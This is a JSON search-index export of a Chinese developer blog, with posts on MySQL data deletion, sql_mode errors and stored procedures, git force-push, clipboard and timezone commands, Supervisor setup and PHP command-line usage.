删除数据及数据表","slug":"mysql-delete-data-and-data-table","date":"2020-08-06T14:36:46.000Z","updated":"2020-09-20T15:39:21.488Z","comments":true,"path":"mysql-delete-data-and-data-table/","link":"","permalink":"https://www.0x2beace.com/mysql-delete-data-and-data-table/","excerpt":"在Mysql 中删除数据以及数据表非常的容易，但是需要特别小心，因为一旦删除所有数据都会消失。","text":"在Mysql 中删除数据以及数据表非常的容易，但是需要特别小心，因为一旦删除所有数据都会消失。 删除数据删除表内数据，使用delete关键字。 删除指定条件的数据删除用户表内id 为1 的用户： 1delete from User where id &#x3D; 1; 删除表内所有数据删除表中的全部数据，表结构不变。 对于 MyISAM 会立刻释放磁盘空间，InnoDB 不会释放磁盘空间。 1delete from User; 释放磁盘空间 1optimize table User; 删除数据表删除数据表分为两种方式： 删除数据表内数据以及表结构 只删除表内数据，保留表结构 drop使用drop关键词会删除整张表，啥都没有了。 1drop table User; truncatetruncate 关键字则只删除表内数据，会保留表结构。 1truncate table User; 思考题：如何批量删除前缀相同的表？ 想要实现 drop table like &#39;wp_%&#39;，没有直接可用的命令，不过可以通过Mysql 的语法来拼接。 1234-- 删除”wp_”开头的表：SELECT CONCAT( &#39;drop table &#39;, table_name, &#39;;&#39; ) AS statementFROM information_schema.tablesWHERE table_schema &#x3D; &#39;database_name&#39; AND table_name LIKE &#39;wp_%&#39;; 其中database_name换成数据库的名称，wp_换成需要批量删除的表前缀。 注意只有drop命令才能这样用： 1drop table if exists tablename&#96;; truncate只能这样使用： 1truncate table &#96;tp_trade&#96;.&#96;setids&#96;; 总结 当你不再需要该表时， 用drop; 当你仍要保留该表，但要删除所有记录时， 用truncate; 当你要删除部分记录时， 用delete。","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Git Push -f 命令详解","slug":"detailed-explanation-of-git-push-f-command","date":"2020-08-05T06:49:02.000Z","updated":"2020-12-10T03:37:24.822Z","comments":true,"path":"detailed-explanation-of-git-push-f-command/","link":"","permalink":"https://www.0x2beace.com/detailed-explanation-of-git-push-f-command/","excerpt":"最近遇到了一个Git Push 相关的问题，同事不小心把一些错误代码提交到仓库了。如果每个人直接更新的话，会导致错误代码也更新到本地了。 这个时候想要避免这种情况的发生，唯一可以做的就是将那些错误代码直接覆盖掉。","text":"最近遇到了一个Git Push 相关的问题，同事不小心把一些错误代码提交到仓库了。如果每个人直接更新的话，会导致错误代码也更新到本地了。 这个时候想要避免这种情况的发生，唯一可以做的就是将那些错误代码直接覆盖掉。 git push -fgit push -f 这个命令的作用是将自己本地仓库的代码直接推送至仓库，完全以你的提交为准，之前其他人的提交都会被覆盖。 那么这么可怕的命令，究竟在什么情况下才适用呢？ 使用时机有两种情况下适合使用这个命令： 确定需要覆覆盖提交，就像上面的那种情况，在明确部分提交会导致异常时，可以使用新的提交去覆盖。 需要整理历史提交记录时，有时候项目的 Commit Logs 可能比较乱，不能清晰的看出每一次提交的作用，可以使用 rebase 命令来清理历史提交记录。因为改变了历史，所以正常来说是 push不成功的，所以需要使用 force push来解决这个问题。 默认分支保护因为可能会出现不小心使用的情况，Github、Gitlab这类源码托管网站会提供分支保护机制。可以避免某个分支被 force push，默认是 master为保护分支。 这里以Gitlab为例，设置-&gt;仓库-&gt;Protected Branches： 所以如果想强制提交，前提需要取消对该分支的保护。 万一自己的代码被覆盖掉了，还救得回来吗？ 其实也是有办法的，那就是换你或是其它有之前提交的同事，再次进行 git push -f，将正确的内容强制提交上去，覆盖上一次git push -f所造成的灾难。 参考链接聽說 git push -f 這個指令很可怕，什麼情況可以使用它呢？","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"Windows/Mac/Linux 如何将内容输出到剪贴板","slug":"how-to-output-content-to-clipboard-on-windows-mac-linux","date":"2020-08-05T02:07:41.000Z","updated":"2020-09-27T01:22:11.596Z","comments":true,"path":"how-to-output-content-to-clipboard-on-windows-mac-linux/","link":"","permalink":"https://www.0x2beace.com/how-to-output-content-to-clipboard-on-windows-mac-linux/","excerpt":"如何将输出直接复制至剪切板？在不同的系统中，所使用的命令是不同的。","text":"如何将输出直接复制至剪切板？在不同的系统中，所使用的命令是不同的。 Mac12345678&#x2F;&#x2F; 将输出复制至剪贴板$ echo &quot;hello mac&quot; | pbcopy&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板$ pbcopy &lt; remade.md&#x2F;&#x2F; 将剪切板中的内容粘贴至文件$ pbpaste &gt; remade.md LinuxLinux 用户需要先安装 xclip，它建立了终端和剪切板之间的通道。 123456789101112&#x2F;&#x2F; 查看剪切板中的内容$ xclip -o$ xclip -selection c -o&#x2F;&#x2F; 将输出复制至剪贴板$ echo &quot;hello xclip&quot; | xclip-selection c&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板$ xclip -selection c remade.md&#x2F;&#x2F; 将剪切板中的内容粘贴至文件$ xclip -selection c -o &gt; remade.md 或者直接使用xsel命令： 12345&#x2F;&#x2F; 将输出复制至剪贴板$ echo &quot;hello linux&quot; | xsel&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板$ xsel &lt; remade.md 需要注意的是：xsel、xclip 命令是在 X 环境下使用的，所以远程连接服务器时使用会报异常： 1xclip error can&#39;t open display (null) Windows12345&#x2F;&#x2F; 将输出复制至剪贴板$ echo &quot;hello windows&quot; | clip&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板$ clip &lt; remade.txt","categories":[{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/categories/Shell/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"如何查看 Linux 默认时区","slug":"how-to-check-the-linux-default-time-zone","date":"2020-08-03T14:03:08.000Z","updated":"2020-08-25T02:19:08.477Z","comments":true,"path":"how-to-check-the-linux-default-time-zone/","link":"","permalink":"https://www.0x2beace.com/how-to-check-the-linux-default-time-zone/","excerpt":"最近遇到一个跟服务器时区相关的问题，没准备充分，当问题真正来临时，很懵。 特别是在生产环境中，系统时区是特别重要的存在，很多应用在默认情况下，都是取的系统时区，如果时区处理不得当的话，可能会造成不必要的困扰。","text":"最近遇到一个跟服务器时区相关的问题，没准备充分，当问题真正来临时，很懵。 特别是在生产环境中，系统时区是特别重要的存在，很多应用在默认情况下，都是取的系统时区，如果时区处理不得当的话，可能会造成不必要的困扰。 时区的概念关于时区，有以下几个标准： CST：北美中部标准时间 UTC：协调世界时，又称世界标准时间，简称UTC，从英文国际时间/法文协调时间”Universal Time/Temps Cordonné”而来。中国大陆、香港、澳门、台湾、蒙古国、新加坡、马来西亚、菲律宾、澳洲西部的时间与UTC的时差均为+8，也就是UTC+8。 GMT：格林尼治标准时间（旧译格林威治平均时间或格林威治标准时间；英语：Greenwich Mean Time，GMT）是指位于英国伦敦郊区的皇家格林尼治天文台的标准时间，因为本初子午线被定义在通过那里的经线。 Linux 的时间分为两种： 硬件时间：由 BIOS（或CMOS）所负责。 系统时间：由 Linux 所负责，系统时间在系统开关机后读取硬件时间后，再由 Linux 管理时间。 datedate命令是显示或设置系统时间与日期。 这个是最简单、最直观获取系统时间与日期的方式了。 12$ dateThu Jul 30 13:23:50 CST 2020 显示所在时区： 12date +&quot;%Z %z&quot;CST +0800 注意 + 和 &quot;之间没有空格，否则会报表。 date 命令常见参数： 12345678910111213141516171819202122232425%H 小时，24小时制（00~23）%I 小时，12小时制（01~12）%k 小时，24小时制（0~23）%l 小时，12小时制（1~12）%M 分钟（00~59）%p 显示出AM或PM%r 显示时间，12小时制（hh:mm:ss %p）%s 从1970年1月1日00:00:00到目前经历的秒数%S 显示秒（00~59）%T 显示时间，24小时制（hh:mm:ss）%X 显示时间的格式（%H:%M:%S）%Z 以字符串的形式显示时区，日期域（CST）%z 以数字的形式显示时区 (+0800)%a 星期的简称（Sun~Sat）%A 星期的全称（Sunday~Saturday）%h,%b 月的简称（Jan~Dec）%B 月的全称（January~December）%c 日期和时间（Tue Nov 20 14:12:58 2012）%d 一个月的第几天（01~31）%x,%D 日期（mm&#x2F;dd&#x2F;yy）%j 一年的第几天（001~366）%m 月份（01~12）%w 一个星期的第几天（0代表星期天）%W 一年的第几个星期（00~53，星期一为第一天）%y 年的最后两个数字（1999则是99） timedatectltimedatectl 命令非常的方便，当你不带任何参数运行它时，这条命令可以像下图一样，输出系统时间概览，其中包含当前时区： 123456789$ timedatectlLocal time: Thu 2020-07-30 05:30:21 UTC Universal time: Thu 2020-07-30 05:30:21 UTC RTC time: Thu 2020-07-30 05:30:21 Time zone: Etc&#x2F;UTC (UTC, +0000) System clock synchronized: yessystemd-timesyncd.service active: yes RTC in local TZ: no 只查看时区： 1$ timedatectl | grep &quot;Time zone&quot; /etc/timezone使用 cat 命令显示文件 /etc/timezone 的内容，来查看时区： 12$ cat &#x2F;etc&#x2F;timezoneEtc&#x2F;UTC 选择时区 1$ tzselect 选择完成之后，将时区相关的配置，写入.profit配置文件中。 然后使用 souce 命令，强制生效。 1souce .profit 参考链接 在 Linux 中查看时区 Linux date 命令 世界时钟地图","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Mysql only_full_group_by 异常记录","slug":"mysql-only-full-group-by-exception-record","date":"2020-07-31T12:17:14.000Z","updated":"2020-08-03T00:05:40.992Z","comments":true,"path":"mysql-only-full-group-by-exception-record/","link":"","permalink":"https://www.0x2beace.com/mysql-only-full-group-by-exception-record/","excerpt":"最近很频繁的遇到一个Mysql 异常，错误信息如下： 123Expression #5 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;cis.q1.query_date&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by","text":"最近很频繁的遇到一个Mysql 异常，错误信息如下： 123Expression #5 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;cis.q1.query_date&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by 通过错误信息可以看到，是因为 sql_mode 引起的。 查看Mysql 当前所使用的 sql_mode： 1234567select @@sql_mode+-------------------------+| @@sql_mode |+-------------------------+| ONLY_FULL_GROUP_BY |+-------------------------+ sql_mode 配置解析ONLY_FULL_GROUP_BY对于GROUP BY聚合操作，如果在SELECT中的列，没有在GROUP BY中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中。简而言之，就是SELECT后面接的列必须被GROUP BY后面接的列所包含。如： select a,b from table group by a,b,c; (正确) select a,b,c from table group by a,b; (错误) 这个配置会使得GROUP BY语句环境变得十分狭窄，所以一般都不加这个配置 NO_AUTO_VALUE_ON_ZERO该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。（不信的可以试试，默认的sql_mode你在自增主键列设置为0，该字段会自动变为最新的自增值，效果和null一样），如果用户希望插入的值为0（不改变），该列又是自增长的，那么这个选项就有用了。 STRICT_TRANS_TABLES在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制。（InnoDB默认事务表，MyISAM默认非事务表；MySQL事务表支持将批处理当做一个完整的任务统一提交或回滚，即对包含在事务中的多条语句要么全执行，要么全部不执行。非事务表则不支持此种操作，批处理中的语句如果遇到错误，在错误前的语句执行成功，之后的则不执行；MySQL事务表有表锁与行锁非事务表则只有表锁） NO_ZERO_IN_DATE在严格模式下，不允许日期和月份为零 NO_ZERO_DATE设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告。 ERROR_FOR_DIVISION_BY_ZERO在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如 果未给出该模式，那么数据被零除时MySQL返回NULL NO_AUTO_CREATE_USER禁止GRANT创建密码为空的用户 NO_ENGINE_SUBSTITUTION如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常 PIPES_AS_CONCAT将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似 ANSI_QUOTES启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符 解决方案编辑my.cnf配置文件，将 ONLY_FULL_GROUP_BY 去掉。 12[mysqld]sql_mode &#x3D; &quot;&quot; 然后重启Mysql 服务即可。 参考链接 记一次Group by 查询时的ONLY_FULL_GROUP_BY错误以及后续","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Supervisor 快速上手","slug":"supervisor-quick-start","date":"2020-07-30T12:38:38.000Z","updated":"2020-09-04T13:54:06.076Z","comments":true,"path":"supervisor-quick-start/","link":"","permalink":"https://www.0x2beace.com/supervisor-quick-start/","excerpt":"supervisord 是一个用 Python 写的进程管理工具，是类Unix系统中的一个进程管理工具， Supervisor 只适用于类Unix 系统，不适用于Window。","text":"supervisord 是一个用 Python 写的进程管理工具，是类Unix系统中的一个进程管理工具， Supervisor 只适用于类Unix 系统，不适用于Window。 安装因为Supervisor 是用 Python 所写的，所以可以直接使用pip 安装： 1sudo pip install supervisor Ubuntu： 1apt-get install supervisor Mac： 1brew install supervisor 配置Supervisor运行时会启动一个进程——supervisord 。 supervisord：它负责启动所管理的进程，并将所管理的进程作为自己的子进程来启动，而且可以在所管理的进程出现崩溃时自动重启。 supervisorctl：是命令行管理工具，可以用来执行 stop、start、restart 等命令，来对这些子进程进行管理。 查看默认配置项 1$ echo_supervisord_conf 将默认配置项重定向至配置文件： 1$ echo_supervisord_conf &gt; &#x2F;etc&#x2F;supervisord.conf 然后可以看到 /etc/ 配置文件下出现了以下文件，其中/etc/supervisor 是我们需要的配置文件。 1234$ find &#x2F;etc&#x2F; -name supervisor&#x2F;etc&#x2F;default&#x2F;supervisor&#x2F;etc&#x2F;init.d&#x2F;supervisor&#x2F;etc&#x2F;supervisor /etc/supervisord.conf 核心配置文件，参考以下部分配置，; 表示注释。 因为Supervisor默认配置会把socket文件和pid守护进程生成在/tmp/目录下，/tmp/目录是缓存目录，所以我们需要手动换成/var/run目录。 12345678910111213141516171819202122232425262728293031323334353637[unix_http_server];file&#x3D;&#x2F;tmp&#x2F;supervisor.sock ; UNIX socket 文件，supervisorctl 会使用file&#x3D;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除;chmod&#x3D;0700 ; socket 文件的 mode，默认是 0700;chown&#x3D;nobody:nogroup ; socket 文件的 owner，格式： uid:gid;[inet_http_server] ; HTTP 服务器，提供 web 管理界面;port&#x3D;127.0.0.1:9001 ; Web 管理后台运行的 IP 和端口，如果开放到公网，需要注意安全性;username&#x3D;user ; 登录管理后台的用户名;password&#x3D;123 ; 登录管理后台的密码[supervisord];logfile&#x3D;&#x2F;tmp&#x2F;supervisord.log ; 日志文件，默认是 $CWD&#x2F;supervisord.loglogfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;supervisord.log ; 修改为 &#x2F;var&#x2F;log 目录，避免被系统删除logfile_maxbytes&#x3D;50MB ; 日志文件大小，超出会 rotate，默认 50MBlogfile_backups&#x3D;10 ; 日志文件保留备份数量默认 10loglevel&#x3D;info ; 日志级别，默认 info，其它: debug,warn,trace;pidfile&#x3D;&#x2F;tmp&#x2F;supervisord.pid ; pid 文件pidfile&#x3D;&#x2F;var&#x2F;run&#x2F;supervisord.pid ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除nodaemon&#x3D;false ; 是否在前台启动，默认是 false，即以 daemon 的方式启动minfds&#x3D;1024 ; 可以打开的文件描述符的最小值，默认 1024minprocs&#x3D;200 ; 可以打开的进程数的最小值，默认 200; the below section must remain in the config file for RPC; (supervisorctl&#x2F;web interface) to work, additional interfaces may be; added by defining them in separate rpcinterface: sections[rpcinterface:supervisor]supervisor.rpcinterface_factory &#x3D; supervisor.rpcinterface:make_main_rpcinterface[supervisorctl];serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;supervisor.sock ; 通过 UNIX socket 连接 supervisord，路径与 unix_http_server 部分的 file 一致serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除;serverurl&#x3D;http:&#x2F;&#x2F;127.0.0.1:9001 ; 通过 HTTP 的方式连接 supervisord; 包含其他的配置文件[include]files &#x3D; relative&#x2F;directory&#x2F;*.ini ; 可以是 *.conf 或 *.ini /etc/supervisor/conf.d 则是用来配置管理进程的配置文件，所有需要被supervisor 管理的进程都需要在这里先配置。 123456789101112131415[program:demo]command&#x3D;php demo.php &#x2F;&#x2F; 需要执行队列的名称directory&#x3D; &#x2F;var&#x2F;www &#x2F;&#x2F; 命令执行的目录或者说执行 command 之前，先切换到工作目录 可以理解为在执行命令前会切换到这个目录 process_name&#x3D;%(process_num)02d &#x2F;&#x2F; 默认为 %(program_name)s，即 [program:x] 中的 x这个是进程名，如果下面的numprocs参数为1的话，就不用管这个参数了，它默认值%(program_name)s也就是上面的那个program冒号后面的numprocs&#x3D;1 &#x2F;&#x2F; 进程数量当不为1时的时候，就是进程池的概念，注意process_name的设置autostart&#x3D;true &#x2F;&#x2F; 是否自动启动autorestart&#x3D;true &#x2F;&#x2F; 程序意外退出是否自动重启startsecs&#x3D;1 &#x2F;&#x2F; 自动重启间隔 startretries&#x3D;20 &#x2F;&#x2F; 当进程启动失败后，最大尝试启动的次数。。当超过3次后，supervisor将把此进程的状态置为FAIL 默认值为3redirect_stderr&#x3D;true &#x2F;&#x2F; 如果为true，则stderr的日志会被写入stdout日志文件中 理解为重定向输出的日志user&#x3D;root &#x2F;&#x2F; 这个参数可以设置一个非root用户，当我们以root用户启动supervisord之后。我这里面设置的这个用户，也可以对supervisord进行管理 stopsignal&#x3D;INTstderr_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.err.log &#x2F;&#x2F; 子进程的stdout的日志路径 输出日志文件stdout_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.out.log &#x2F;&#x2F; 错误日志文件 当redirect_stderr&#x3D;true。这个就不用 启动1$ supervisord -c &#x2F;etc&#x2F;supervisord.conf 常用命令整理停止进程，program_name 为 [program:x] 里的 x 1supervisorctl stop program_name 启动进程 1supervisorctl start program_name 重启进程 1supervisorctl restart program_name 结束所有属于名为 groupworker 这个分组的进程 (start，restart 同理) 1supervisorctl stop groupworker: 结束 groupworker:name1 这个进程 (start，restart 同理) 1supervisorctl stop groupworker:name1 停止全部进程，注：start、restart、stop 都不会载入最新的配置文件 1supervisorctl stop all 载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程 1supervisorctl reload 根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启 1supervisorctl update 常见问题unlinking stale socket /var/run/supervisor.sock1234$ find &#x2F; -name supervisor.sock&#x2F;run&#x2F;supervisor.sock$ unlink &#x2F;run&#x2F;supervisor.sock 参考链接 “unix:///tmp/supervisor.sock no such file” 错误处理 https://segmentfault.com/a/1190000015768529 使用 supervisor 管理进程 Python 进程管理工具 Supervisor 使用教程","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Tutorial","slug":"PHP/Tutorial","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/"},{"name":"进程管理","slug":"PHP/Tutorial/进程管理","permalink":"https://www.0x2beace.com/categories/PHP/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"进程管理","slug":"进程管理","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"name":"Supervisor","slug":"Supervisor","permalink":"https://www.0x2beace.com/tags/Supervisor/"}]},{"title":"在 Linux 命令行中执行和使用 PHP 代码","slug":"execute-and-use-php-code-on-the-linux-command-line","date":"2020-07-29T00:08:12.000Z","updated":"2020-11-27T03:05:13.069Z","comments":true,"path":"execute-and-use-php-code-on-the-linux-command-line/","link":"","permalink":"https://www.0x2beace.com/execute-and-use-php-code-on-the-linux-command-line/","excerpt":"众所周知，PHP是一门脚本语言，主要用于服务端（JavaScript 用于客户端）以通过HTTP 生成动态网页。","text":"众所周知，PHP是一门脚本语言，主要用于服务端（JavaScript 用于客户端）以通过HTTP 生成动态网页。 所以与其他脚本语言一样，可以直接在终端中不需要网页浏览器来运行PHP 代码。 获取安装信息在安装完PHP 以及Nginx 之后，接下来我们通常需要做的是，在/usr/local/var/www (Mac 上的Nginx 工作目录)上创建一个内容为&lt;?php phpinfo(); ?&gt;，名为index.php的文件来测试PHP 是否安装正确。 执行以下命令即可： 1# echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php 然后，使用浏览器访问http://127.0.0.1/index.php，不出意外可以看到： 如何在终端中直接查看该信息？ 1# php -f &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php | less 如果你觉得上面这种方式太麻烦了，那么还有一种更简便的方式可以达到同样的效果。 1# php -r &#39;php phpinfo();&#39; | less 交互模式有时候我们会遇到这样一种情况，想测试一小段代码，看看其运行结果，但是又不想重新创建一个文件，太麻烦了。 如果这个时候有一个地方可以直接运行这段代码且输出结果，那该多好啊。 PHP 为我们提供了两种交互模式，前者是自动的，后者是手动的。 Interactive shell Interactive mode enabled 两种模式都是使用 php -a 命令进入。 Interactive shell使用这个交互式shell，你可以直接在命令行窗口里输入PHP并直接获得输出结果。 1234567$ php -aInteractive shellphp &gt;echo &quot;Hello PHP&quot;;Hello PHPphp &gt; echo 10+90;100 回车即可查看输出内容。 Interactive mode enabled1234$ php -aInteractive mode enabledphp &gt;echo &quot;Hello PHP&quot;; 如果出现的是这个模式，说明你的PHP并不支持交互式shell， 不过不用担心，这个模式同样也可以执行PHP 代码，只是代码的执行方式有些区别。 输入了所有PHP代码后，输入Ctrl-Z（windows里），或输入Ctrl-D（linux里），你输入的所有代码将会一次执行完成并输出结果。 输入exit或者⌃ + c 退出交互模式。 PHP 脚本在终端中可以把PHP 脚本作为Shell 脚本来运行。 首先你需要创建一个PHP 脚本文件： 1# echo -e &#39;#!&#x2F;usr&#x2F;bin&#x2F;php\\n&lt;?php phpinfo();?&gt;&#39; &gt; phpscript.php -e 表示激活转义字符。 注意，这个脚本文件中的第一行#!/usr/bin/php，就像是Shell 脚本中的#!/bin/bash。目的是告诉Linux 命令行使用PHP 解析器来解析该文件。 运行该脚本： 12# chmod +x phpscript.php &#x2F;&#x2F; 使脚本具有执行权限# .&#x2F;phpscript.php &#x2F;&#x2F;执行脚本 PHP 服务PHP 有内置一个WebServer，可以很方便快速的搭建一个PHP 服务。 1$ php -t &#x2F;project to path -S localhost:port 然后通过浏览器访问localhost:port 就可以了。 总结 php -a：进入交互模式 php -f：解析和执行文件 php -h：获取帮助 php -i：查看PHP 信息和配置 php -m：显示已经安装的模块 php -r：运行PHP代码不使用脚本标签’‘ php -v：查看PHP 版本 php -ini：查看加载配置文件（php.ini、conf.d） php -i | grep configure：查看静态编译模块 php --ri swoole：查看指定模块的配置 locate php.ini：查询本地配置文件 time php script.php：查看程序的执行时间 参考链接 在 Linux 命令行中执行和使用 PHP 代码 12 个 Linux 终端中有用的 PHP 命令行用法","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"如何解决“ORDER BY子句不在SELECT列表中”的问题","slug":"list-causes-mysql-5-7-with-select-distinct-and-order-by","date":"2020-07-28T00:29:37.000Z","updated":"2020-07-28T15:28:10.444Z","comments":true,"path":"list-causes-mysql-5-7-with-select-distinct-and-order-by/","link":"","permalink":"https://www.0x2beace.com/list-causes-mysql-5-7-with-select-distinct-and-order-by/","excerpt":"记录一个最近遇到的Mysql 问题。","text":"记录一个最近遇到的Mysql 问题。 问题描述：在本地项目中，部分SQL 语句执行起来，总是会报一个错。而同样的SQL，在线上的服务器中执行起来没有任何问题。 错误提示内容： 1Expression #2 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;foodorder.orderlist.cname&#39; which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode&#x3D;only_full_group_by QMYSQL: Unable to execute query 我的第一反应就是检查Mysql 的版本，很巧的是本地Mysql的版本确实比服务器的版本低一些。很快我就想到一定是版本存在差异性，导致语法不兼容。 升级Mysql既然是版本不一的问题，那就升级本地的Mysql 好了。 因为我的Mysql 是之前通过Homebrew 安装的，所以如需要升级，根本不用我自己手动去寻找安装包，直接通过Homebrew 的Upgrade 命令自动升级就好了。 起初我还担心自动升级会不会把我的Mysql 的版本更新的5.7以上，后来证明是我想多了。 不过在正式更新之前需要做好以下几件事情： 对数据库做好必要的备份 停止本地Mysql 服务 确定所要更新的Mysql 版本 做好以上三件事之后，就可以开始升级了。 1234$ brew search mysqlmysql@5.7 ✔$ brew upgrade mysql@5.7... 终于安装好之后，再次开启Mysql 的服务，我发现还是没有解决我的问题，还是会提示相同的错误。 这时候我才意识到这个问题和Mysql 的版本没有关系，有关系应该是相关的模块。 通过查阅一番资料，才发现是因为 group by 中的列一定要出现在 select 中，除非强制 sqlmode 中使用 ONLY_FULL_GROUP_BY。 开启sql-mode 模式123456789$ vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.cnf# 增加如下内容[mysqld]sql_mode&#x3D;&#39;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&#39;;# 或者[mysqld]sql_mode &#x3D; &quot;&quot; 重启Mysql 服务器，即可。 参考链接 如何解决 MySQL 5.7带有SELECT DISTINCT和ORDER BY的问题 | stack voerflow Mysql 服务器SQL 模式","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql 存储过程入门","slug":"getting-started-with-mysql-stored-procedures","date":"2020-07-27T15:50:50.000Z","updated":"2020-07-27T15:51:55.775Z","comments":true,"path":"getting-started-with-mysql-stored-procedures/","link":"","permalink":"https://www.0x2beace.com/getting-started-with-mysql-stored-procedures/","excerpt":"最近面临一个需求，需要使用Mysql 写一段存储过程，对数据库中的数据表做批量操作。 应该算是知识盲区了，花了一些时间去学习如何写好一个存储过程，最终也顺利写出来了，记录一下。","text":"最近面临一个需求，需要使用Mysql 写一段存储过程，对数据库中的数据表做批量操作。 应该算是知识盲区了，花了一些时间去学习如何写好一个存储过程，最终也顺利写出来了，记录一下。 以下两点是其中比较重要的部分： 关于变量的使用 在存储过程中使用动态SQL 语句 存储过程中的变量MySQL存储过程常见的变量：局部变量、用户变量、系统变量。 局部变量在过程体中，可以声明局部变量，用来临时保存一些值。 1DECLARE var_name[, var_name] ... type [DEFAULT value]; 其中，type为MySQL的数据类型，如:int、float、date、varchar(length) 。 使用局部变量时，需要注意以下两点： DECLARE用来声明局部变量，且DECLARE仅被用在BEGIN … END复合语句里，并且必须在复合语句的开头，在任何其它语句之前；可以被用在嵌套的块中，除了那些用相同名字声明变量的块。 如果要给变量提供一个默认值，使用DEFAULT子句(值可以是常数，也可以指定为一个表达式)；如果没有DEFAULT子句，初始值为NULL。 用户变量用户变量与数据库连接有关：在当前连接中声明的变量，在连接断开的时候，就会消失；在此连接中声明的变量无法在另一连接中使用。 用户变量使用@关键字去定义。 在存储过程中动态执行SQL其实这个理解成一套模版，只要按照标准去执行这套模版，就可以了。 1234567891011121314151617181920212223242526272829303132333435-- 连接数据库use databaseName;-- 定义结束符为 $$delimiter $$-- 判断是否存在该名称的存储过程，如果存在就删除drop procedure if exists wk;-- 创建新的存储过程create procedure wk()begin -- 声明变量 declare days int default 366; declare dates int;-- 循环体WHILE days - 1 &gt; 0 DO -- 为变量赋值 SET dates &#x3D; DATE_FORMAT(DATE_SUB(CURDATE(), INTERVAL dayofyear(now())- days DAY), &quot;%Y%m%d&quot;); SET days &#x3D; days - 1; -- 拼接表名 set @table_name &#x3D; CONCAT(&quot;tableName&quot;, dates); -- 拼接需要执行SQL 语句，后面的内容需要根据实际情况替换掉 SET @sql &#x3D; CONCAT(&quot;ALTER TABLE &quot;, @table_name, &quot; -- 需要执行的SQL &quot;); -- 预处理动态SQL 语句，其中stmt 是一个变量 PREPARE stmt FROM @sql; -- 执行SQL 语句 EXECUTE stmt ; -- 释放prepare deallocate prepare stmt;-- 结束循环end WHILE;-- 结束定义语句end $$delimiter ;call wk(); 大致上就是这样，至此，一个完整的Mysql 